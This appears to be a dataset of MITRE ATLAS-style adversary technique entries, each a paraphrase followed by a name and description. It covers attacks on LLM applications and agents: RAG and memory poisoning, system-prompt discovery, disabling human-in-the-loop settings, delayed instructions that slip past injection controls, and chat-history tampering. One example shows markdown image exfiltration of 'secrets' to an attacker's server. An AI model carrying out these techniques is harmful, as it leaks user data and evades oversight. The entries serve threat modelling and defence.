text: Special Character Sets is a technique where adversaries identify the specific delimiters and special character sets utilized by a large language model. This process often involves discovering the markers used in retrieval augmented generation applications to distinguish between retrieved context and user prompts. By identifying these characters, an attacker can later exploit them to confuse or manipulate the model, potentially causing it to misbehave or bypass intended operational constraints.
name: Special Character Sets
description: Adversaries may discover delimiters and special characters sets used by the large language model. For example, delimiters used in retrieval augmented generation applications to differentiate between context and user prompts. These can later be exploited to confuse or manipulate the large language model into misbehaving.

text: System Instruction Keywords is a technique where adversaries identify specific words or phrases that hold special meaning for a large language model, such as object names or function names. By discovering these keywords, an attacker can later exploit them to confuse or manipulate the model's behavior, potentially forcing the system to make unauthorized calls to plugins that the model has access to.
name: System Instruction Keywords
description: Adversaries may discover keywords that have special meaning to the large language model (LLM), such as function names or object names. These can later be exploited to confuse or manipulate the LLM into misbehaving and to make calls to plugins the LLM has access to.

text: System Prompt is a technique where adversaries attempt to discover the internal instructions provided by an AI system builder to a large language model. By uncovering these system instructions, an attacker can better understand the model's specific capabilities and constraints, which can then be used to identify weaknesses and circumvent the system's established guardrails.
name: System Prompt
description: Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.

text: RAG Poisoning is a technique where adversaries inject malicious content into the data indexed by a retrieval augmented generation (RAG) system to contaminate future interactions. By placing manipulated documents in locations that the RAG system indexes, attackers can ensure that specific malicious or misleading information surfaces as a search result for particular user queries. This content may consist of false information, fraudulent RAG entries, or prompt injections containing malicious instructions designed to alter the model's behavior.
name: RAG Poisoning
description:
Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)).

The content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.

text:
False RAG Entry Injection is a technique where adversaries introduce fraudulent entries into a victim's retrieval augmented generation (RAG) database. By embedding content designed to be interpreted as a separate document within a data source being ingested, the attacker tricks the large language model into treating part of the retrieved content as a legitimate RAG result.

This method allows adversaries to bypass data monitoring tools and prevents the malicious document from being easily deleted. To increase the effectiveness of the attack, adversaries may use discovered system keywords to instruct the LLM on how to process the content as a RAG entry and may manipulate metadata such as the document title, author, and creation date to enhance the deception.
name: False RAG Entry Injection
description:
Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When RAG entry including the false document is retrieved, the LLM is tricked into treating part of the retrieved content as a false RAG result. 

By including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly. 

The adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.

text: Reverse Shell is a technique that adversaries use to communicate with and maintain control over a compromised victim system. Unlike a typical remote connection where a user initiates a client connection to a listening remote machine, a reverse shell flips this process by having the victim system initiate the outgoing connection to the adversary's listening machine. This approach is often used to bypass firewall restrictions that typically block incoming connections but allow outgoing traffic.
name: Reverse Shell
description:
Adversaries may utilize a reverse shell to communicate and control the victim system.

Typically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.

text: Impersonation is a technique where adversaries pretend to be a trusted person or organization to deceive a target into performing specific actions. By posing as a known sender—such as a colleague, executive, or third-party vendor—attackers leverage established trust to manipulate victims, often utilizing communication methods like phishing or social engineering powered by large language models. This technique can be used to target multiple victims to achieve broader goals, specifically focusing on critical resources within the AI DevOps lifecycle, including software registries, container registries, and model repositories.
name: Impersonation
description:
Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052), or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims.

Adversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.

text: Masquerading is a technique where adversaries manipulate the features of their artifacts to make them appear legitimate or benign to users and security tools. This process involves abusing or altering the name or location of an object—whether it is legitimate or malicious—to evade detection and observation. Common methods of masquerading include manipulating file metadata, tricking users into misidentifying a file type, or assigning legitimate-sounding names to malicious tasks and services.
name: Masquerading
description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

text:
Cloud Service Discovery is a technique used by adversaries to enumerate the cloud services running on a system after gaining initial access. This process involves identifying enabled services across various cloud delivery models, including Infrastructure-as-a-Service (IaaS), Platform-as-a-Service (PaaS), Software-as-a-Service (SaaS), and AI-as-a-Service (AIaaS).

The goal of this technique is to map the environment to identify potential targets for further exploitation. Adversaries may look for CI/CD pipelines, Lambda functions, Entra ID, and various AI capabilities such as AI inference, generative AI, and agentic AI. They also target security and logging services, such as AWS GuardDuty, Microsoft Defender for Cloud, AWS CloudTrail, and Google Cloud Audit Logs, to understand the monitoring capabilities in place.

To achieve this, attackers often leverage cloud-native tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, to enumerate resources, applications, management groups, and policy definitions accessible to a compromised identity. Additionally, they may use specialized tools to validate credentials and discover available AI models across providers like OpenAI, Anthropic, AWS Bedrock, Azure, GCP Vertex AI, and others.
name: Cloud Service Discovery
description:
Adversaries may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), software-as-a-service (SaaS), or AI-as-a-service (AIaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, AI Inference, Generative AI, Agentic AI, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.

Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. They may use tools to check credentials and enumerate the AI models available in various AIaaS providers' environments including AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, and GCP Vertex AI [\[1\]][1].

[1]: https://www.sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack

text: Corrupt AI Model is a technique where an adversary purposefully corrupts a malicious AI model file to prevent it from being successfully deserialized. The primary purpose of this technique is to evade detection by model scanners that rely on proper deserialization to analyze the file's contents. Despite the corruption, the model may still be capable of executing malicious code before the deserialization process ultimately fails.
name: Corrupt AI Model
description: An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.

text:
LLM Response Rendering is a technique where an adversary manipulates a large language model to include private information within its response that is hidden from the user but processed by the user's client application. This method allows for the exfiltration of sensitive data by leveraging how clients render specific content, such as images, HTML tags, or markdown.

In a typical scenario, the adversary prompts the AI to generate a response containing an image hosted on an attacker-controlled server. When the client application renders the image, it automatically sends a request to that server. By embedding private data into the image's request parameters, the adversary can capture the sensitive information directly on their server without requiring any interaction or clicks from the user.
name: LLM Response Rendering
description: An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. The adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown For example, an LLM may produce the following markdown: ``` ![ATLAS](https://atlas.mitre.org/image.png?secrets="private data") ``` Which is rendered by the client as: ``` ``` When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.

text: Drive-by Compromise is a technique where adversaries gain unauthorized access to an AI system when a user visits a website during normal browsing or when an AI agent retrieves web-based information on a user's behalf. This method can be used to deliver LLM Prompt Injections that, once executed, alter the behavior of the AI model. Additionally, this approach may be employed to deliver various types of malicious code that do not specifically target AI systems.
name: Drive-by Compromise
description:
Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model.

The same approach may be used to deliver other types of malicious code that don't target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).

text:
Stage Capabilities is a technique where adversaries upload, install, or set up tools and resources to be used during the targeting phase of an operation. To support their goals, adversaries stage capabilities they have either developed or obtained on infrastructure they control, which may include rented, purchased, or compromised systems. 

These capabilities are often hosted on public web services, such as GitHub, or specialized platforms like container registries and model registries such as Hugging Face. The artifacts staged may include malicious models, poisoned datasets, and prompt injections. To increase the effectiveness of their campaign, adversaries may employ deceptive tactics such as typosquatting, targeting the names of legitimate products and companies, or utilizing hallucinated entities.
name: Stage Capabilities
description:
Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017)) or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008)) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.

Adversaries may stage a variety of AI Artifacts including poisoned datasets ([Publish Poisoned Datasets](/techniques/AML.T0019), malicious models ([Publish Poisoned Models](/techniques/AML.T0058), and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).

text: AI Agent Context Poisoning is a technique where adversaries manipulate the context provided to an AI agent's large language model to influence its generated responses or the actions it takes. By corrupting this context, an attacker can persistently alter the target agent's behavior to achieve specific goals. This poisoning can be achieved by prompting the model to store malicious instructions or preferences within its memory, or by injecting misleading information into a conversation thread that the model uses as part of its active context.
name: AI Agent Context Poisoning
description:
Adversaries may attempt to manipulate the context used by an AI agent's large language model (LLM) to influence the responses it generates or actions it takes. This allows an adversary to persistently change the behavior of the target agent and further their goals.

Context poisoning can be accomplished by prompting the an LLM to add instructions or preferences to memory (See [Memory](/techniques/AML.T0080.000)) or by simply prompting an LLM that uses prior messages in a thread as part of its context (See [Thread](/techniques/AML.T0080.001)).

text: Memory is a technique where adversaries manipulate the memory of a large language model to ensure changes persist across future chat sessions. This exploits the common LLM feature that utilizes user-specific databases to remember information based on conversational inputs. By using direct or indirect prompt injection, an attacker can inject malicious memories into the system. These manipulated memories may contain instructions designed to leak private conversations or be used to promote the adversary's hidden agenda by manipulating the user.
name: Memory
description:
Adversaries may manipulate the memory of a large language model (LLM) in order to persist changes to the LLM to future chat sessions. 

Memory is a common feature in LLMs that allows them to remember information across chat sessions by utilizing a user-specific database. Because the memory is controlled via normal conversations with the user (e.g. "remember my preference for ...") an adversary can inject memories via Direct or Indirect Prompt Injection. Memories may contain malicious instructions (e.g. instructions that leak private conversations) or may promote the adversary's hidden agenda (e.g. manipulating the user).

text:
Thread is a technique where adversaries introduce malicious instructions into a large language model's chat thread to cause persistent behavior changes for the remainder of the conversation. Because chat threads can span multiple sessions, these instructions can have long-term effects.

This technique can be executed through direct prompt injection, such as when an adversary uses stolen API keys to inject queries, or through indirect prompt injection. As LLMs adopt larger context windows and higher token limits, malicious instructions can persist longer within a thread. Furthermore, this approach can affect multiple users in environments with shared threads, such as an AI agent active in a multi-participant Slack channel, where a single malicious message can influence the agent's future interactions with all other participants.
name: Thread
description:
Adversaries may introduce malicious instructions into a chat thread of a large language model (LLM) to cause behavior changes which persist for the remainder of the thread. A chat thread may continue for an extended period over multiple sessions.

The malicious instructions may be introduced via Direct or Indirect Prompt Injection. Direct Injection may occur in cases where the adversary has acquired a user's LLM API keys and can inject queries directly into any thread.

As the token limits for LLMs rise, AI systems can make use of larger context windows which allow malicious instructions to persist longer in a thread.
Thread Poisoning may affect multiple users if the LLM is being used in a service with shared threads. For example, if an agent is active in a Slack channel with multiple participants, a single malicious message from one user can influence the agent's behavior in future interactions with others.

text: Modify AI Agent Configuration is a technique where adversaries modify the configuration files of AI agents on a system to ensure malicious changes persist and affect all agents sharing that configuration. By tampering with system prompts, replacing knowledge sources, or altering the settings of connected tools, an attacker can redirect outputs to malicious services, embed instructions for data exfiltration, or weaken security controls. This technique may specifically involve disabling security settings that require human-in-the-loop oversight for harmful actions, allowing adversaries to achieve their goals and maintain long-term corruption of the AI agent.
name: Modify AI Agent Configuration
description:
Adversaries may modify the configuration files for AI agents on a system. This allows malicious changes to persist beyond the life of a single agent and affects any agents that share the configuration.

Configuration changes may include modifications to the system prompt, tampering with or replacing knowledge sources, modification to settings of connected tools, and more. Through those changes, an attacker could redirect outputs or tools to malicious services, embed covert instructions that exfiltrate data, or weaken security controls that normally restrict agent behavior.

Adversaries may modify or disable a configuration setting related to security controls, such as those that would prevent the AI Agent from taking actions that may be harmful to the user's system without human-in-the-loop oversight. Disabling AI agent security features may allow adversaries to achieve their malicious goals and maintain long-term corruption of the AI agent.

text: RAG Credential Harvesting is a technique where adversaries leverage their access to a large language model on a victim's system to collect sensitive credentials. This occurs when credentials stored within internal documents are inadvertently ingested into a Retrieval-Augmented Generation database, allowing an AI agent to retrieve and expose them to the attacker.
name: RAG Credential Harvesting
description: Adversaries may attempt to use their access to a large language model (LLM) on the victim's system to collect credentials. Credentials may be stored in internal documents which can inadvertently be ingested into a RAG database, where they can ultimately be retrieved by an AI agent.

text: Credentials from AI Agent Configuration is a technique where adversaries access the credentials of other tools or services by extracting them from an AI agent's configuration. Because AI agents frequently utilize external services to perform actions—such as invoking APIs, querying databases, or interacting with cloud resources—they often require API keys, tokens, and connection strings to function. While secure secret managers or encrypted vaults are available for this purpose, these credentials are often stored in less protected configuration files for convenience or ease of deployment. By reading or extracting these configurations, an attacker can obtain valid credentials to gain direct access to sensitive systems outside of the AI agent itself.
name: Credentials from AI Agent Configuration
description:
Adversaries may access the credentials of other tools or services on a system from the configuration of an AI agent.

AI Agents often utilize external tools or services to take actions, such as querying databases, invoking APIs, or interacting with cloud resources. To enable these functions, credentials like API keys, tokens, and connection strings are frequently stored in configuration files. While there are secure methods such as dedicated secret managers or encrypted vaults that can be deployed to store and manage these credentials, in practice they are often placed in less protected locations for convenience or ease of deployment. If an attacker can read or extract these configurations, they may obtain valid credentials that allow direct access to sensitive systems outside the agent itself.

text: Discover AI Agent Configuration is a technique where adversaries attempt to uncover configuration details of AI agents residing on a victim's system. The primary goal of this activity is to identify the specific tools, services, and permissions the agent has access to, which helps the adversary better target their subsequent attacks. This information can be obtained through direct access to configuration files and administrative dashboards, or through indirect methods such as prompting the AI agent with specific questions about its own capabilities and available tools.
name: Discover AI Agent Configuration
description:
Adversaries may attempt to discover configuration information for AI agents present on the victim's system. Agent configurations can include tools or services they have access to.

Adversaries may directly access agent configuring dashboards or configuration files. They may also obtain configuration details by prompting the agent with questions such as "What tools do you have access to?"

Adversaries can use the information they discover about AI agents to help with targeting.

text: Embedded Knowledge is a technique where adversaries attempt to discover the specific data sources and information an AI agent can access. By analyzing the agent's configuration, an attacker can reveal the underlying knowledge base, which may contain sensitive or proprietary material such as intellectual property, customer data, internal policies, or credentials. Mapping this embedded knowledge allows an adversary to better understand the AI agent's role, potentially exposing confidential information or identifying high-value targets for further exploitation.
name: Embedded Knowledge
description:
Adversaries may attempt to discover the data sources a particular agent can access.  The AI agent's configuration may reveal data sources or knowledge.

The embedded knowledge may include sensitive or proprietary material such as intellectual property, customer data, internal policies, or even credentials. By mapping what knowledge an agent has access to, an adversary can better understand the AI agent's role and potentially expose confidential information or pinpoint high-value targets for further exploitation.

text: Tool Definitions is a technique where adversaries discover the specific tools an AI agent has access to. By identifying these available tools, an attacker can understand the range of actions the agent can execute and the external resources it can reach. This process may reveal access to sensitive data sources, such as OneDrive or SharePoint, or expose potential exfiltration paths, such as the ability to send emails. Ultimately, this knowledge allows adversaries to identify which AI agents provide the highest value or the greatest opportunity for a successful attack.
name: Tool Definitions
description: Adversaries may discover the tools the AI agent has access to. By identifying which tools are available, the adversary can understand what actions may be executed through the agent and what additional resources it can reach. This knowledge may reveal access to external data sources such as OneDrive or SharePoint, or expose exfiltration paths like the ability to send emails, helping adversaries identify AI agents that provide the greatest value or opportunity for attack.

text: Activation Triggers is a technique where adversaries identify specific keywords or events—such as incoming emails, the addition of documents, incoming messages, or other automated workflows—that activate an AI agent and prompt it to execute further actions. By understanding these triggers, an attacker can uncover how an AI agent is controlled and activated within its environment. This knowledge can expose new vectors for compromise, allowing an adversary to trigger the agent from external sources to force it to perform unintended or malicious activities.
name: Activation Triggers
description:
Adversaries may discover keywords or other triggers (such as incoming emails, documents being added, incoming message, or other workflows) that activate an agent and may cause it to run additional actions.

Understanding these triggers can reveal how the AI agent is activated and controlled. This may also expose additional paths for compromise, as an adversary could attempt to trigger the agent from outside its environment and drive it to perform unintended or malicious actions.

text: Call Chains is a technique where adversaries extract call chains from AI agent configurations to identify potential targets for remote code execution or other vulnerabilities. These vulnerable call chains typically connect user inputs or large language model outputs to an execution sink, such as exec, eval, or os.popen. Once identified, these vulnerabilities may be exploited through methods like LLM Prompt Injection. Adversaries may systematically analyze LLM frameworks to find these vulnerable call chains and then scan for specific applications configured to use them for targeting.
name: Call Chains
description:
Adversaries may extract call chains from AI agent configurations, which can reveal potentially targets for remote code execution (RCE) or other vulnerabilities. Vulnerable call chains often connect user inputs or LLM outputs to an execution sink (e.g. exec, eval, os.popen). The vulnerabilities may be later exploited via [LLM Prompt Injection](/techniques/AML.T0051).

Adversaries may systematically identify potentially vulnerable call chains present in LLM frameworks, then scan for applications that are configured to use these call chains for targeting [\[1\]][1].

[1]: https://arxiv.org/abs/2309.02926

text: Data from AI Services is a technique where adversaries leverage their access to a victim organization's AI-enabled services to collect proprietary or sensitive information. As organizations implement centralized generative AI services, such as chat agents utilizing retrieval augmented generation (RAG) databases and other integrated tools, these services become high-value targets. Because AI agents are often configured with access to tools and data sources that are not directly available to standard users, adversaries may abuse these permissions to extract data that would otherwise be inaccessible.
name: Data from AI Services
description:
Adversaries may use their access to a victim organization's AI-enabled services to collect proprietary or otherwise sensitive information. As organizations adopt generative AI in centralized services for accessing an organization's data, such as with chat agents which can access retrieval augmented generation (RAG) databases and other data sources via tools, they become increasingly valuable targets for adversaries.

AI agents may be configured to have access to tools and data sources that are not directly accessible by users. Adversaries may abuse this to collect data that a regular user wouldn't be able to access directly.

text: RAG Databases is a technique where adversaries prompt an AI service to retrieve sensitive information from a Retrieval-Augmented Generation database. This approach allows an attacker to potentially access and extract a significant portion of an organization's internal documents and private data stored within the system.
name: RAG Databases
description: Adversaries may prompt the AI service to retrieve data from a RAG database. This can include the majority of an organization's internal documents.

text: AI Agent Tools is a technique where adversaries prompt an AI service to invoke various tools that the agent has access to. These tools are designed to retrieve data from different APIs or services within an organization, and by manipulating the agent, an attacker can potentially gain unauthorized access to sensitive information or execute unintended actions through these integrated services.
name: AI Agent Tools
description: Adversaries may prompt the AI service to invoke various tools the agent has access to. Tools may retrieve data from different APIs or services in an organization.

text:
Exfiltration via AI Agent Tool Invocation is a technique where AI agent tools capable of performing write operations are manipulated to send data to an adversary. Sensitive information is encoded into the tool's input parameters and transmitted to an adversary-controlled location, such as a server, document, or inbox, disguised as a legitimate action. Common variants of this technique include sending emails, modifying documents, updating CRM records, or generating media like images and videos.

This exfiltration can occur when a legitimate tool is triggered by an adversary through LLM Prompt Injection, or when a malicious tool is used directly. Additionally, AI Agent Tool Poisoning can be employed to manipulate the inputs and destinations of a legitimate tool during its normal usage by a victim.
name: Exfiltration via AI Agent Tool Invocation
description:
AI agent tools capable of performing write operations may be invoked to exfiltrate data to an adversary. Sensitive information can be encoded into the tool's input parameters and transmitted to an adversary-controlled location (such as an inbox, document, or server) as part of a seemingly legitimate action. Variants include sending emails, creating or modifying documents, updating CRM records, or even generating media such as images or videos.

The invoked tool itself may be legitimate but invoked by an adversary via [LLM Prompt Injection](/techniques/AML.T0051), or the tool may be malicious (See [AI Agent Tool Poisoning](/techniques/AML.T0110).

[AI Agent Tool Poisoning](/techniques/AML.T0110) can also be used manipulate the inputs and destination of a separate legitimate tool, invoked through normal usage by the victim.

text:
Gather Victim Identity Information is a technique where adversaries collect details about a target's identity to facilitate more effective attacks. This gathered information can range from general personal data, such as employee names, email addresses, and photos, to highly sensitive details like login credentials or multi-factor authentication configurations.

Adversaries obtain this data through various methods, including direct elicitation, searching websites owned by the victim, or purchasing leaked information from black market sources. Once acquired, this identity information can be used to create deepfakes for convincing impersonation. Such impersonation allows adversaries to establish fraudulent accounts under the victim's identity or execute highly targeted and believable phishing attacks.
name: Gather Victim Identity Information
description:
Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, photos, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.

Adversaries may gather this information in various ways, such as direct elicitation, [Search Victim-Owned Websites](/techniques/AML.T0003), or via leaked information on the black market.

Adversaries may use the gathered victim data to Create Deepfakes and impersonate them in a convincing manner. This may create opportunities for adversaries to [Establish Accounts](/techniques/AML.T0021) under the impersonated identity, or allow them to perform convincing [Phishing](/techniques/AML.T0052) attacks.

text:
Generate Deepfakes is a technique where adversaries use generative artificial intelligence to create synthetic media, including imagery, video, audio, and text, that appears authentic. These deepfakes can be used to mimic real individuals or create entirely fictional personas.

The primary purpose of this technique is to facilitate impersonation for activities such as phishing or to bypass security measures, specifically AI-driven biometric identity verification systems. While media manipulation has existed for a long time, the advent of generative AI has significantly lowered the required skill level and effort, enabling adversaries to scale their operations rapidly and perform manipulations in real time. To achieve this, attackers may repurpose open-source models and software designed for legitimate use or utilize specialized tools specifically tailored for malicious activities and account fraud.
name: Generate Deepfakes
description:
Adversaries may use generative artificial intelligence (GenAI) to create synthetic media (i.e. imagery, video, audio, and text) that appear authentic. These "[deepfakes]( https://en.wikipedia.org/wiki/Deepfake)" may mimic a real person or depict fictional personas. Adversaries may use deepfakes for impersonation to conduct [Phishing](/techniques/AML.T0052) or to evade AI applications such as biometric identity verification systems (see [Evade AI Model](/techniques/AML.T0015)).

Manipulation of media has been possible for a long time, however GenAI reduces the skill and level of effort required, allowing adversaries to rapidly scale operations to target more users or systems. It also makes real-time manipulations feasible.

Adversaries may utilize open-source models and software that were designed for legitimate use cases to generate deepfakes for malicious use. However, there are some projects specifically tailored towards malicious use cases such as [ProKYC](https://www.catonetworks.com/blog/prokyc-selling-deepfake-tool-for-account-fraud-attacks/).

text:
Process Discovery is a technique used by adversaries to gather information about the processes currently running on a system. By identifying the active software and applications, an attacker can gain a better understanding of the AI-related software stack present within a network, which helps them identify new targets and potential attack pathways.

This process is particularly valuable for adversaries seeking to locate application tokens used by AI software to authenticate with backend services, which can subsequently facilitate credential access and lateral movement. While basic information may be available to any user, administrator or elevated access typically provides more comprehensive process details.

In Windows environments, this technique is often executed using the Tasklist utility via the command prompt, the Get-Process cmdlet in PowerShell, or by utilizing Native API calls such as CreateToolhelp32Snapshot. On Mac and Linux systems, adversaries typically achieve this using the ps command or by enumerating the /proc directory.
name: Process Discovery
description:
Adversaries may attempt to get information about processes running on a system. Once obtained, this information could be used to gain an understanding of common AI-related software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details.

Identifying the AI software stack can then lead an adversary to new targets and attack pathways. AI-related software may require application tokens to authenticate with backend services. This provides opportunities for [Credential Access](/tactics/AML.TA0013) and [Lateral Movement](/tactics/AML.TA0015).

In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or `Get-Process` via PowerShell. Information about processes can also be extracted from the output of Native API calls such as `CreateToolhelp32Snapshot`. In Mac and Linux, this is accomplished with the `ps` command. Adversaries may also opt to enumerate processes via `/proc`.

text: OS Credential Dumping is a technique where adversaries extract credentials from OS caches, application memory, or other sources on a compromised system. These credentials may appear as hashes or clear text and can include usernames, passwords, application tokens, or other authentication keys. Once obtained, these credentials can be used to perform lateral movement to access other AI services, such as AI agents, large language models, or AI inference APIs. Additionally, this technique can provide an adversary with access to various software tools and data sources integrated into the AI DevOps lifecycle.
name: OS Credential Dumping
description:
Adversaries may extract credentials from OS caches, application memory, or other sources on a compromised system. Credentials are often in the form of a hash or clear text, and can include usernames and passwords, application tokens, or other authentication keys.

Credentials can be used to perform [Lateral Movement](/tactics/AML.TA0015) to access other AI services such as AI agents, LLMs, or AI inference APIs. Credentials could also give an adversary access to other software tools and data sources that are part of the AI DevOps lifecycle.

text: Use Alternate Authentication Material is a technique where adversaries utilize non-standard authentication credentials, such as password hashes, Kerberos tickets, and application access tokens, to bypass normal system access controls. By leveraging these materials, attackers can move laterally within an environment to gain unauthorized access to different systems or accounts. This technique is particularly relevant to AI services, which frequently rely on alternate authentication material as a primary method for users to submit queries, thereby increasing their vulnerability to this approach.
name: Use Alternate Authentication Material
description:
Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

AI services commonly use alternate authentication material as a primary means for users to make queries, making them vulnerable to this technique.

text:
Application Access Token is a technique where adversaries use stolen tokens to bypass standard authentication processes to gain unauthorized access to restricted accounts, information, or services on remote systems. These tokens, which are typically stolen from users or services, are used as substitutes for traditional login credentials.

Application access tokens are designed to facilitate authorized API requests on behalf of a user or service. They are widely utilized to access resources within cloud environments, container-based applications, software-as-a-service (SaaS), and AI-as-a-service (AIaaS) platforms. Specifically, these tokens are commonly employed for AI services, including chatbots, large language models (LLMs), and predictive inference APIs.
name: Application Access Token
description:
Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, software-as-a-service (SaaS), and AI-as-a-service(AIaaS). They are commonly used for AI services such as chatbots, LLMs, and predictive inference APIs.

text:
Manipulate User LLM Chat History is a technique where adversaries alter a user's large language model chat history to conceal malicious activities. The primary purpose of this action is to cover tracks, such as hiding persistent changes made to the LLM's behavior or obscuring attempts to extract private user information.

To achieve this, an adversary may delete existing messages, edit previous entries, or create entirely new chat threads. This is typically possible if the attacker has obtained the victim's authentication tokens for the backend LLM service or has direct access to the user's chat interface. Because many chat interfaces, particularly on desktop, only update the history upon initial opening and do not display injected prompts during an active session, these manipulations often go unnoticed by the victim.
name: Manipulate User LLM Chat History
description:
Adversaries may manipulate a user's large language model (LLM) chat history to cover the tracks of their malicious behavior. They may hide persistent changes they have made to the LLM's behavior, or obscure their attempts at discovering private information about the user.

To do so, adversaries may delete or edit existing messages or create new threads as part of their coverup. This is feasible if the adversary has the victim's authentication tokens for the backend LLM service or if they have direct access to the victim's chat interface. 

Chat interfaces (especially desktop interfaces) often do not show the injected prompt for any ongoing chat, as they update chat history only once when initially opening it. This can help the adversary's manipulations go unnoticed by the victim.

text:
Prompt Infiltration via Public-Facing Application is a technique where an adversary introduces malicious prompts into a victim's system through a public-facing application. The goal is for this content to be ingested by an AI system at a later time to create a downstream effect. This can occur when a retrieval augmented generation (RAG) system indexes the data source, when an AI agent is triggered by a specific rule, or when a user interacts with the malicious content using a large language model.

These malicious prompts can persist within the victim's system for long periods, potentially impacting multiple users and various AI tools across the organization. Any application that accepts text input is a potential target, including email, shared document systems like Google Drive or OneDrive, and ticketing systems such as Jira. Infiltration can also occur via OCR-mediated methods, where malicious instructions are embedded in images, invoices, or screenshots. To execute this technique, adversaries may perform reconnaissance to identify applications likely to be monitored by AI agents or indexed by RAG systems, and may further investigate AI agent configurations to refine their targeting.
name: Prompt Infiltration via Public-Facing Application
description:
An adversary may introduce malicious prompts into the victim's system via a public-facing application with the intention of it being ingested by an AI at some point in the future and ultimately having a downstream effect. This may occur when a data source is indexed by a retrieval augmented generation (RAG) system, when a rule triggers an action by an AI agent, or when a user utilizes a large language model (LLM) to interact with the malicious content. The malicious prompts may persist on the victim system for an extended period and could affect multiple users and various AI tools within the victim organization.

Any public-facing application that accepts text input could be a target. This includes email, shared document systems like OneDrive or Google Drive, and service desks or ticketing systems like Jira. This also includes OCR-mediated infiltration where malicious instructions are embedded in images, screenshots, and invoices that are ingested into the system.

Adversaries may perform [Reconnaissance](/tactics/AML.TA0002) to identify public facing applications that are likely monitored by an AI agent or are likely to be indexed by a RAG. They may perform [Discover AI Agent Configuration](/techniques/AML.T0084) to refine their targeting.

text: Delay Execution of LLM Instructions is a technique where adversaries include instructions for an AI system to be executed only in response to a future event, such as a specific keyword or a subsequent interaction. This method is used to evade detection and bypass security controls that might otherwise block malicious instructions during the initial prompt. For instance, an attacker might frame a prompt to trigger malicious behavior only if the user submits a new request. This technique specifically targets security measures in AI agents that prevent the use of certain tools or data sources during a conversation turn containing untrusted data, allowing the adversary to defer the execution of the attack to a later point in the interaction.
name: Delay Execution of LLM Instructions
description:
Adversaries may include instructions to be followed by the AI system in response to a future event, such as a specific keyword or the next interaction, in order to evade detection or bypass controls placed on the AI system.

For example, an adversary may include "If the user submits a new request..." followed by the malicious instructions as part of their prompt.

AI agents can include security measures against prompt injections that prevent the invocation of particular tools or access to certain data sources during a conversation turn that has untrusted data in context. Delaying the execution of instructions to a future interaction or keyword is one way adversaries may bypass this type of control.

